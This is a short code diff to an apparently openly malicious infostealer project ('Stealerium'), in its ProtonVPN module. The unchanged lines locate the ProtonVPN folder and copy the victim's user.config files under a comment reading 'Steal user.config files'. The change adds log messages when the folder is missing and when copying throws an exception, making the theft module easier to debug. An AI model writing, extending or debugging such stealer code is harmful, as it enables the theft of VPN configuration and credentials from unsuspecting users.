@@ -14,7 +14,11 @@ namespace Stealerium.Target.VPN
                 "ProtonVPN");
             // Stop if not exists
             if (!Directory.Exists(vpn))
+            {
+                Logging.Log($"Proton VPN >> Not Exist!\n");
                 return;
+            }
+                
             try
             {
                 // Steal user.config files
@@ -31,9 +35,9 @@ namespace Stealerium.Target.VPN
                             File.Copy(configLocation, copyDirectory + "\\user.config");
                         }
             }
-            catch
+            catch(Exception ex)
             {
-                // ignored
+                Logging.Log($"Proton VPN >> Exception : {ex.Message}\n");
             }
         }
     }
